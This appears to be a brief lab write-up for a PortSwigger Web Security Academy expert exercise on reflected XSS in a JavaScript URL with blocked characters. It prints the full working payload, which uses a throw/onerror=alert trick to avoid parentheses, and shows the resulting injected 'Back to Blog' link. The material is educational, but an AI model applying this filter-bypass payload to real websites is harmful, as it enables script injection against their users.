# EXPERT: Reflected XSS in a JavaScript URL with some characters blocked

```jsx
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

![Снимок экрана 2025-12-01 в 11.15.56.png](EXPERT%20Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_11.15.56.png)

https://www.youtube.com/watch?v=bCpBD--GCtQ&t=763s

When Back to blog is clicked, analytics script gets executed with our payload:

![Снимок экрана 2025-12-01 в 11.24.00.png](EXPERT%20Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_11.24.00.png)

```jsx
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ =&gt; window.location = '/')">Back to Blog</a>
```